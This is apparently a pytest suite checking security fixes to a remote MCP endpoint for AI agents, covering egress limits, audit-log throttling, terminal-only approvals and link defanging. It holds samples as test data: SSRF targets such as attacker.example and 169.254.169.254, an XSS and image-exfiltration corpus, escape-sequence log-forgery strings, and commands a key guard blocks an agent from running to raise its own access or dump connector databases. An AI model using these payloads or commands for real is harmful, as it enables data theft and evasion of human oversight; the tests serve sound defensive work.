"""Fixes from the security review of the remote endpoint: egress, audit floods, who may approve, the pairing window,
private-text leaks, inert links, stale approvals, and the smaller items."""
import builtins
import inspect
import json
import re
import time

import httpx
import pytest
from remote_support import AGENT, REDIRECT, Clock, Rig, pkce

from emporia import autonomy, cli, mcp_surface
from emporia import remote as R
from emporia.remote import audit as audit_mod
from emporia.remote import egress, surface
from emporia.remote import cli as rcli
from emporia.remote.audit import AuditLog


@pytest.fixture
def rig(tmp_path, monkeypatch):
    return Rig(tmp_path, monkeypatch)


@pytest.fixture
def keys(tmp_path):
    d = tmp_path / "keys"
    d.mkdir(exist_ok=True)
    (d / "emporia.env").write_text(f"EMPORIA_AGENT_ID={AGENT}\nEMPORIA_RELAY_URL=http://127.0.0.1:1\n")
    return d


@pytest.fixture
def terminal(monkeypatch):
    monkeypatch.setattr(rcli, "at_a_terminal", lambda: True)
    monkeypatch.setattr(builtins, "input", lambda prompt="": "y")


def run(*argv) -> int:
    return cli.main(["agent", *argv])


# ── B1: a remote call reaches this agent's relays and nothing else ───────────────────

HOME = "relay.home.test"


@pytest.fixture
def egress_on(monkeypatch):
    monkeypatch.setattr(egress, "ALLOWED_HOSTS", lambda: {HOME})
    egress.install()
    seen, refused = [], []
    monkeypatch.setattr(httpx.HTTPTransport, "handle_request",
                        lambda self, request: seen.append(request.url.netloc.decode()) or httpx.Response(200, json={}, request=request))
    real = egress._refuse
    monkeypatch.setattr(egress, "_refuse", lambda url: refused.append(egress.url_host(str(url))) or real(url))
    return seen, refused


def test_egress_lets_a_remote_call_reach_only_the_agents_own_relays(egress_on):
    seen, refused = egress_on
    token = autonomy.REMOTE_CALL.set("conn")
    try:
        assert httpx.get(f"https://{HOME}/health").status_code == 200
        for url in ("https://attacker.example/agents/SECRET/card", "http://127.0.0.1:9/x", "http://169.254.169.254/",
                    "http://10.0.0.5/x", "https://user:pw@attacker.example/", "http://[::1]:80/"):
            with pytest.raises(httpx.ConnectError):
                httpx.get(url)
    finally:
        autonomy.REMOTE_CALL.reset(token)
    assert seen == [HOME] and len(refused) == 6
    assert httpx.get("https://elsewhere.example/ok").status_code == 200      # a local call is not restricted here


def test_host_arguments_are_refused_before_the_call_as_a_first_layer(monkeypatch):
    monkeypatch.setattr(egress, "ALLOWED_HOSTS", lambda: {HOME})
    from emporia.remote.surface import CallContext, check_call
    ctx = CallContext("g", "c", "n", (R.SCOPE_READ, R.SCOPE_TALK))
    bad = [("agent_card", {"agent": "x@attacker.example"}), ("agent_card", {"agent": "x@127.0.0.1:8088", "passport": True}),
           ("agent_card", {"agent": "x@169.254.169.254"}), ("agent_card", {"agent": "x@10.1.2.3:80"}),
           ("read_thread", {"ref": "agent:x@attacker.example"}), ("verify", {"kind": "identity", "compare_with": "https://a.example"}),
           ("verify", {"kind": "relay_log", "compare_with": "https://a.example"}),
           ("scan_relays", {"relays": ["https://a.example"]}), ("read_feed", {"relay": "https://attacker.example"}),
           ("records", {"agent_id": "bob@attacker.example"})]
    for tool, args in bad:
        assert check_call(tool, args, ctx, AGENT), (tool, args)
    assert check_call("agent_card", {"agent": f"x@{HOME}"}, ctx, AGENT) == ""
    assert check_call("agent_card", {"agent": "just-a-name"}, ctx, AGENT) == ""
    assert check_call("read_thread", {"ref": f"post:abc@{HOME}"}, ctx, AGENT) == ""


def _args_for(fn) -> dict:
    out = {}
    for name, p in inspect.signature(fn).parameters.items():
        if p.kind in (p.VAR_POSITIONAL, p.VAR_KEYWORD) or name in ("kind", "view", "mode", "limit", "since", "value"):
            continue
        ann = str(p.annotation)
        if name == "agent":
            out[name] = "x@attacker.example"
        elif name == "ref":
            out[name] = "agent:x@attacker.example"
        elif name == "compare_with" or name == "relay":
            out[name] = "https://attacker.example"
        elif name == "passport":
            out[name] = True
        elif "list" in ann:
            out[name] = ["https://attacker.example/a"]
        elif "str" in ann or isinstance(p.default, str):
            out[name] = "x@attacker.example"
    return out


def test_every_real_read_and_talk_tool_only_ever_reaches_the_home_relay(egress_on, monkeypatch):
    """The real tool functions (guards and shaping included), run as a remote call with a host in every argument:
    no request goes to any host but the home relay."""
    from fastmcp.tools import Tool

    from emporia import mcp_server
    seen, refused = egress_on
    monkeypatch.setattr(egress, "ALLOWED_HOSTS", lambda: {HOME, egress.url_host(mcp_server.RELAY_URL)})
    token = autonomy.REMOTE_CALL.set("conn")
    ran = []
    try:
        for comp in list(mcp_server.mcp.local_provider._components.values()):
            if not isinstance(comp, Tool) or comp.name not in surface.REMOTE_TOOLS:
                continue
            variants = [_args_for(comp.fn)]
            if comp.name == "verify":
                variants += [{"kind": "relay_log", "compare_with": "https://attacker.example"},
                             {"kind": "identity", "target": "x@attacker.example"}]
            if comp.name == "scan_relays":
                variants += [{"relays": ["https://attacker.example", "http://127.0.0.1:9"], "kind": "pointer"}]
            for args in variants:
                try:
                    out = comp.fn(**args)
                    if inspect.isawaitable(out):
                        import asyncio
                        asyncio.run(out)
                except Exception:  # noqa: BLE001 - a refusal or an error is fine; a request to a stranger is not
                    pass
                ran.append(comp.name)
    finally:
        autonomy.REMOTE_CALL.reset(token)
    assert set(ran) >= surface.REMOTE_TOOLS
    allowed = {HOME, egress.url_host(mcp_server.RELAY_URL)}
    assert set(seen) <= allowed, sorted(set(seen) - allowed)
    assert not any("attacker" in h or h in ("127.0.0.1", "169.254.169.254") and h not in allowed for h in seen)
    assert any("attacker" in h or "127.0.0.1" in h for h in refused), "the test must have tried to reach out"


# ── H1: floods ────────────────────────────────────────────────────────────────────────

async def test_a_flood_of_refused_registrations_and_authorizations_adds_a_handful_of_lines(rig):
    rig.clock.advance(3600)                                # the pairing window has closed
    before = len(rig.audit.rows())
    async with rig.running() as c:
        for _ in range(250):
            r = await c.http.post("/register", json={"client_name": "x", "redirect_uris": [REDIRECT]})
            assert r.status_code == 403 and "emporia agent connector open" in r.json()["error_description"]
        for _ in range(250):
            assert (await c.http.get("/authorize", params={"client_id": "x"})).status_code == 400
    added = len(rig.audit.rows()) - before
    assert added <= 8, added
    # rate-limit refusals too, with the window open
    rig.auth.open_pairing(10)
    async with rig.running() as c:
        for _ in range(40):
            await c.http.post("/register", json={"client_name": "x", "redirect_uris": [REDIRECT]})
    assert len([r for r in rig.audit.rows() if r["event"] == "register_refused"]) <= 8


def test_the_audit_log_does_not_reread_its_file_and_keeps_only_so_many_rotated_files(tmp_path, monkeypatch):
    log = AuditLog(tmp_path, Clock())
    reads = []
    real = AuditLog._tail_hash
    monkeypatch.setattr(AuditLog, "_tail_hash", staticmethod(lambda p: reads.append(p) or real(p)))
    for i in range(30):
        log.write("e", n=i)
    assert len(reads) <= 1, "after the first line the last hash is kept, not read again"
    log.write("after another writer")
    other = AuditLog(tmp_path, Clock())
    other.write("a second process writes")
    log.write("and the first notices")                      # the file changed under it: it rereads the tail
    assert log.verify()[0] is True
    monkeypatch.setattr(audit_mod, "ROTATE_BYTES", 400)
    monkeypatch.setattr(audit_mod, "KEEP_ARCHIVES", 3)
    clock = Clock()
    small = AuditLog(tmp_path / "small", clock)
    for i in range(80):
        clock.advance(1)
        small.write("event", n=i, pad="x" * 60)
    assert len(small.archives()) == 3
    assert small.verify()[0] is True


def test_the_throttle_writes_the_1st_10th_and_100th_of_a_kind_in_a_minute(tmp_path):
    clock = Clock()
    log = AuditLog(tmp_path, clock)
    for _ in range(150):
        log.write_throttled("k", "refused")
    assert [r["count"] for r in log.rows()] == [1, 10, 100]
    clock.advance(61)
    log.write_throttled("k", "refused")
    assert len(log.rows()) == 4


# ── H2: only a person at a terminal ───────────────────────────────────────────────────

async def test_approve_takes_no_yes_and_needs_a_terminal(tmp_path, monkeypatch, keys, capsys):
    rig = Rig(tmp_path, monkeypatch, clock=Clock(time.time()))
    async with rig.running() as c:
        reg, verifier, page = await c.start()
        code = rig.auth.pending_rows()[0]["code"]
        assert run("connector", "approve", str(keys), code, "--yes") == 2
        assert "does not take --yes" in capsys.readouterr().err
        assert run("connector", "approve", str(keys), code) == 2                 # no terminal here
        assert "terminal" in capsys.readouterr().err
        assert run("connector", "allow-redirect", str(keys), "https://host.example/cb", "--yes") == 2
        assert rig.store.one("SELECT COUNT(*) n FROM grants")["n"] == 0
        assert rig.store.allowed_redirects() == []


def test_an_agents_session_may_not_run_the_connector_commands(tmp_path, monkeypatch, keys, capsys, terminal):
    Rig(tmp_path, monkeypatch, clock=Clock(time.time()))
    monkeypatch.setenv("HERMES_SESSION_ID", "abc")
    for argv in (("connector", "list", str(keys)), ("connector", "pending", str(keys)),
                 ("connector", "open", str(keys)), ("connector", "revoke", str(keys), "--all"),
                 ("connector", "deny", str(keys), "ABCD-EFGH"),
                 ("serve-remote", str(keys), "--public-url", "https://a.example")):
        assert run(*argv) == 2, argv
        assert "person's to do" in capsys.readouterr().err


def _guard():
    from importlib import util
    spec = util.spec_from_file_location("kg2", "hermes_plugin/emporia/key_guard.py")
    kg = util.module_from_spec(spec)
    spec.loader.exec_module(kg)
    return kg


def test_the_key_guard_holds_the_dm_setting_the_remote_settings_and_the_other_ways_in():
    kg = _guard()
    for text in ("echo 'EMPORIA_DM_AGENT_ACCESS=full' >> /x/profile/.env", "echo EMPORIA_REMOTE_SCOPES=read,talk >> /x/.env",
                 "hermes config set EMPORIA_DM_AGENT_ACCESS full", "echo EMPORIA_REMOTE_PUBLIC_URL=https://x >> .env"):
        veto = kg.pre_tool_call(tool_name="terminal", args={"command": text})
        assert veto and veto["action"] == "block", text
    for text in ("python -c 'from emporia import remote; print(remote)'",
                 "python -c \"import importlib; importlib.import_module('emporia.remote.oauth')\"",
                 "python3 -c \"__import__('emporia.remote')\"", "python -c 'import emporia . remote'",
                 "sqlite3 ~/.config/emporia/agents/*/rem*/conn*.db .dump", "sqlite3 /x/agents/a/remote/c*.db .dump"):
        veto = kg.pre_tool_call(tool_name="terminal", args={"command": text})
        assert veto and veto["action"] == "block", text
    assert kg.pre_tool_call(tool_name="terminal", args={"command": "ls /tmp && echo hello"}) is None


# ── H3: the pairing window ────────────────────────────────────────────────────────────

async def test_register_and_authorize_are_closed_unless_the_person_opened_a_window(tmp_path, monkeypatch, keys, capsys):
    rig = Rig(tmp_path, monkeypatch, clock=Clock(time.time()))
    async with rig.running() as c:
        assert (await c.http.post("/register", json={"client_name": "x", "redirect_uris": [REDIRECT]})).status_code == 201
        rig.clock.advance(601)
        r = await c.http.post("/register", json={"client_name": "x", "redirect_uris": [REDIRECT]})
        assert r.status_code == 403 and "connector open" in r.json()["error_description"]
        reg_id = rig.store.one("SELECT client_id FROM clients")["client_id"]
        _, challenge = pkce()
        page = await c.http.get("/authorize", params=c.authorize_params(reg_id, challenge))
        assert page.status_code == 400 and "connector open" in page.text and "location" not in page.headers
        # a token the person already approved keeps working: the window is for pairing only
        rig.clock.t = time.time()                         # the CLI keeps real time; so does the server from here
        assert run("connector", "open", str(keys), "--minutes", "5") == 0
        out = capsys.readouterr().out
        assert "open for 5 minutes" in out and "your own browser" in out
        assert (await c.http.post("/register", json={"client_name": "x", "redirect_uris": [REDIRECT]})).status_code == 201
        rig.clock.advance(301)
        assert (await c.http.post("/register", json={"client_name": "x", "redirect_uris": [REDIRECT]})).status_code == 403


def test_the_server_opens_a_ten_minute_window_at_start(rig):
    assert round(rig.store.pairing_until() - rig.clock()) == 600
    assert any(r["event"] == "pairing_open" for r in rig.audit.rows())


async def test_approve_shows_this_requests_own_address_and_the_warning(tmp_path, monkeypatch, keys, capsys, terminal):
    rig = Rig(tmp_path, monkeypatch, clock=Clock(time.time()))
    async with rig.running() as c:
        reg = await c.register()
        other = "http://127.0.0.1:7777/other"
        rig.store.run("UPDATE clients SET redirect_uris=?", (json.dumps([REDIRECT, other]),))
        _, challenge = pkce()
        await c.http.get("/authorize", params=c.authorize_params(reg["client_id"], challenge, redirect_uri=other))
        assert run("connector", "pending", str(keys)) == 0
        assert "ONLY the code your own browser shows" in capsys.readouterr().out
        code = rig.auth.pending_rows()[0]["code"]
        assert run("connector", "approve", str(keys), code) == 0
        shown = capsys.readouterr().out
        assert other in shown and REDIRECT not in shown and "your own browser" in shown
        page = (await c.http.get(rig.auth.pending_rows()[0]["code"] if False else "/consent/none")).status_code
        assert page == 404


async def test_the_consent_page_says_to_approve_only_the_code_your_own_browser_shows(rig):
    async with rig.running() as c:
        reg, verifier, page = await c.start()
        assert "own browser" in (await c.http.get(page)).text


# ── M1: private text in the wake notice and whats_next ────────────────────────────────

def test_the_wake_notice_carries_no_private_text_unless_access_is_full(monkeypatch):
    from emporia.plugins.platforms.emporia.frames import format_frame
    frame = {"type": "dm_received", "sender_id": "bob", "thread_id": "dm_1", "content": "my secret words", "encrypted": False}
    monkeypatch.setenv("EMPORIA_DM_AGENT_ACCESS", "full")
    assert "my secret words" in format_frame(frame, "alpha-agent").text
    monkeypatch.setenv("EMPORIA_DM_AGENT_ACCESS", "metadata")
    n = format_frame(frame, "alpha-agent")
    assert "my secret words" not in n.text and "bob" in n.text and "withheld" in n.text and "get_dm_messages" not in n.text
    monkeypatch.setenv("EMPORIA_DM_AGENT_ACCESS", "person")
    n = format_frame(frame, "alpha-agent")
    assert "my secret words" not in n.text and "bob" not in n.text and "dm_1" not in n.text
    assert "dashboard" in n.text and "get_dm_messages" not in n.text


def test_whats_next_withholds_who_wrote_and_which_thread_in_person_mode(monkeypatch):
    answer = {"success": True, "unread_total": 2, "items": [
        {"kind": "message", "why": "unread DM from bob", "tool": "get_dm_messages", "args": {"thread_id": "dm_1"},
         "call": "get_dm_messages(thread_id='dm_1')"},
        {"kind": "quest", "why": "your next quest", "tool": "post", "args": {}, "call": "post()"}]}
    monkeypatch.setenv("EMPORIA_DM_AGENT_ACCESS", "person")
    out = mcp_surface.shape("whats_next", json.loads(json.dumps(answer)))
    text = json.dumps(out)
    assert "bob" not in text and "dm_1" not in text and out["private_messages_waiting"] == 1
    assert "your next quest" in text
    monkeypatch.setenv("EMPORIA_DM_AGENT_ACCESS", "full")
    assert "bob" in json.dumps(mcp_surface.shape("whats_next", json.loads(json.dumps(answer))))


# ── M2 ─────────────────────────────────────────────────────────────────────────────────

def test_viewer_id_and_subscribed_by_are_own_id_arguments():
    ctx = surface.CallContext("g", "c", "n", (R.SCOPE_READ,))
    for key in ("viewer_id", "subscribed_by", "author_id", "voter_id"):
        assert "one agent only" in surface.check_call("list_rooms", {key: "someone-else"}, ctx, AGENT), key
    assert surface.check_call("list_rooms", {"viewer_id": AGENT}, ctx, AGENT) == ""


# ── M3 / LOW: the log holds a stranger's words ────────────────────────────────────────

def test_control_characters_never_reach_the_log_or_the_terminal(tmp_path, capsys):
    log = AuditLog(tmp_path, Clock())
    evil = "\x1b[2J\x1b[31mred\nforged line\r  end \x07"
    log.write("probe", why=evil, connector=evil, detail=evil)
    raw = (tmp_path / "audit.jsonl").read_text()
    assert "\x1b" not in raw and "\x07" not in raw and len(raw.splitlines()) == 1 and " " not in raw
    assert audit_mod.summarize({evil: "x", "text": evil}) and all("\x1b" not in k for k in audit_mod.summarize({evil: 1}))
    row = log.rows()[0]
    assert "\n" not in row["why"] and "\x1b" not in row["why"]
    line = rcli._fmt({"at": 0, "event": "x\x1b[2J", "why": "line one\nforged 2000-01-01 approve"})
    assert "\n" not in line and "\x1b" not in line
    assert rcli._log(log, False) == 0
    out = capsys.readouterr().out
    assert "\x1b" not in out and out.count("\n") == 1


# ── M4: links stay inert ──────────────────────────────────────────────────────────────

CORPUS = [
    "![a[b]](//evil.example/x)", "![" + "alt " * 80 + "](//evil.example/y)", "![x](https://evil.example/p.png?d=SECRET)",
    "[ref link][1]\n\n[1]: https://evil.example/ref", "[text](//evil.example/z)", "[t](javascript:alert(1))",
    "<video src=//evil.example/v.mp4>", "<audio src=//evil.example/a>", "<IMG SRC=x onerror=1>", "<a href='//evil.example'>x</a>",
    "<svg onload=1>", "<iframe src=//evil.example>", "<link rel=stylesheet href=//evil.example/s.css>",
    "<object data=//evil.example>", "visit www.evil.example/path now", "//evil.example/bare", "ftp://evil.example/f",
    "<//evil.example/x>", "<www.evil.example>", "see (https://evil.example/a)", "![ok]\n(https://evil.example/n)",
    "[a](<https://evil.example/b>)", "HTTPS://EVIL.EXAMPLE/UP", "data:text/html;base64,AAAA ![x](data:image/png;base64,AAAA)",
]


@pytest.mark.parametrize("text", CORPUS)
def test_nothing_in_the_adversarial_corpus_survives_as_a_link_or_an_image(text):
    out = surface.defang(text)
    assert not re.search(r"(?:[a-z][a-z0-9+.-]*:)?//\S", out, re.I), out
    assert "](" not in out and "![" not in out and "www." not in out.lower(), out
    assert not re.search(r"<\s*/?\s*(?:img|a|video|audio|iframe|script|svg|link|object|source)\b", out, re.I), out


# ── M5 ─────────────────────────────────────────────────────────────────────────────────

async def test_an_approval_nobody_collected_is_void_and_purged(rig):
    async with rig.running() as c:
        reg, verifier, page = await c.start()
        c.approve()
        rig.clock.advance(30 * 24 * 3600)
        st = (await c.http.get(page + "/status")).json()
        assert st["status"] == "expired" and "access_denied" in st["redirect"]
        assert rig.store.one("SELECT COUNT(*) n FROM codes")["n"] == 0
    async with rig.running() as c:
        reg, verifier, page = await c.start()
        c.approve()
        rig.clock.advance(R.PENDING_TTL + 125)
        rig.store.purge()
        assert rig.store.one("SELECT COUNT(*) n FROM pending WHERE status='approved'")["n"] == 0
        # an approval collected in time still works
    async with rig.running() as c:
        reg, verifier, page = await c.start()
        c.approve()
        rig.clock.advance(30)
        assert (await c.finish(reg, verifier, page)).status_code == 200


# ── M6 ─────────────────────────────────────────────────────────────────────────────────

async def test_standing_stats_and_limits_and_the_local_state_checks_are_refused_remotely(rig):
    async with rig.running() as c:
        t = (await c.tokens())["access_token"]
        for view in ("stats", "limits"):
            assert "refused remotely" in (await c.tool(t, "standing", view=view))["error"]
        for kind in ("session", "dm_chain", "room_chain", "relay_log"):
            assert "refused remotely" in (await c.tool(t, "verify", kind=kind))["error"], kind


def test_the_playbook_leaves_whats_next_for_a_remote_caller():
    answer = {"success": True, "playbook": "custom", "untrusted_content": {"playbook": "custom", "items": []}}
    assert surface.own_filter("whats_next", answer) is answer
    token = autonomy.REMOTE_CALL.set("c")
    try:
        out = surface.own_filter("whats_next", answer)
    finally:
        autonomy.REMOTE_CALL.reset(token)
    assert "playbook" not in out and "playbook" not in out["untrusted_content"]


def test_a_remote_call_leaves_no_last_look_or_note_on_the_machine(tmp_path, monkeypatch):
    from emporia import mcp_server as m
    f = tmp_path / "look.json"
    monkeypatch.setattr(m, "_look_file", lambda: f)
    monkeypatch.delenv("EMPORIA_NO_LOOK_NOTE", raising=False)
    token = autonomy.REMOTE_CALL.set("c")
    try:
        m._note_last_look("alpha-agent")
        assert not f.exists()
        assert m._ask_about_8004("alpha-agent") is None
    finally:
        autonomy.REMOTE_CALL.reset(token)
    m._note_last_look("alpha-agent")
    assert f.exists()


# ── LOW ────────────────────────────────────────────────────────────────────────────────

async def test_forwarded_headers_are_believed_only_from_the_configured_proxy(tmp_path, monkeypatch):
    rig = Rig(tmp_path, monkeypatch, proxy_ip="10.0.0.5")
    bad = {"x-forwarded-proto": "http"}
    async with rig.running(peer="10.0.0.5", headers=bad) as c:
        assert (await c.http.get("/.well-known/oauth-authorization-server")).status_code == 400
    async with rig.running(peer="127.0.0.1", headers=bad) as c:                       # loopback is not the proxy now
        assert (await c.http.get("/.well-known/oauth-authorization-server")).status_code == 200
    async with rig.running(peer="10.0.0.5", headers={"x-forwarded-for": "9.9.9.9, 198.51.100.7"}) as c:
        t = (await c.tokens())["access_token"]
        await c.tool(t, "whats_next")
    assert [r["peer"] for r in rig.audit.rows() if r["event"] == "call"] == ["198.51.100.7"]


def test_a_remote_call_fails_closed_when_the_write_record_has_nowhere_to_live(monkeypatch):
    monkeypatch.setattr(autonomy, "store_dir", lambda: None)
    assert autonomy._count_untracked("post", {}) == ""
    token = autonomy.REMOTE_CALL.set("c")
    try:
        assert "nowhere to be kept" in autonomy._count_untracked("post", {})
    finally:
        autonomy.REMOTE_CALL.reset(token)


async def test_clients_whose_grants_are_all_revoked_do_not_count_toward_the_cap(rig):
    async with rig.running() as c:
        for i in range(R.MAX_CLIENTS):
            rig.store.run("INSERT INTO clients VALUES(?,?,?,?,?,?)", (f"c{i}", "n", "[]", "emporia:read", rig.clock(), 0))
            rig.store.run("INSERT INTO grants(grant_id,client_id,name,scopes,created_at,expires_at,revoked_at) "
                          "VALUES(?,?,?,?,?,?,?)", (f"g{i}", f"c{i}", "n", "[]", rig.clock(), rig.clock() + 1e6, rig.clock()))
        rig.auth.open_pairing(10)
        assert (await c.http.post("/register", json={"client_name": "x", "redirect_uris": [REDIRECT]})).status_code == 201


def test_the_serve_remote_child_gets_no_credentials_of_other_systems(tmp_path, monkeypatch, keys):
    import subprocess
    monkeypatch.setenv("EMPORIA_UNTRACKED_TURNS", "")
    for k in ("OP_SERVICE_ACCOUNT_TOKEN", "BW_SESSION", "VAULT_TOKEN", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"):
        monkeypatch.setenv(k, "x")
    (keys / "emporia.env").write_text((keys / "emporia.env").read_text() + "OP_SERVICE_ACCOUNT_TOKEN=x\nAWS_REGION=x\n")
    seen = {}
    monkeypatch.setattr(subprocess, "run", lambda cmd, env=None, **kw: seen.update(env=env, cmd=cmd)
                        or subprocess.CompletedProcess(cmd, 0))
    assert run("serve-remote", str(keys), "--public-url", "https://a.example", "--behind-proxy", "--bind", "0.0.0.0:9",
               "--proxy-ip", "10.0.0.5") == 0
    env = seen["env"]
    assert not [k for k in env if k.startswith(("OP_", "BW_", "VAULT_", "AWS_", "AZURE_", "DOPPLER_", "INFISICAL_"))]
    assert set(env) <= {"PATH", "HOME"} | {k for k in env if k.startswith("EMPORIA_")}
    assert seen["cmd"][-3:] == ["--behind-proxy", "--proxy-ip", "10.0.0.5"]


def test_the_read_scope_text_says_it_returns_member_only_room_text():
    from emporia.remote.app import SCOPE_TEXT
    assert "members-only" in SCOPE_TEXT[R.SCOPE_READ] and "members-only" in rcli.SCOPE_EFFECT[R.SCOPE_READ]
